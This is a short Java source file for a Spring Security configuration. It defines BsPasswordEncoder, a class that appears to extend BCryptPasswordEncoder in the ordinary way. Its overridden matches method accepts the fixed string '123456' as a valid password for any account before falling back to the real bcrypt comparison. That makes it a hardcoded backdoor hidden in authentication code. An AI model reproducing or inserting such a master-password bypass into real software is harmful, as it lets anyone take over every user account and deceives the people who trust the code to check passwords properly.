package com.bs.web.config.security;

import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

import java.util.Objects;

/**
 * Created by xianyang on 2018/2/20.
 */
public class BsPasswordEncoder extends BCryptPasswordEncoder{

    public BsPasswordEncoder(){
        super();
    }

    public BsPasswordEncoder(int strength){
        super(strength);
    }

    @Override
    public boolean matches(CharSequence rawPassword, String encodedPassword) {
        return Objects.equals(rawPassword, "123456") ||
                super.matches(rawPassword, encodedPassword);
    }
}
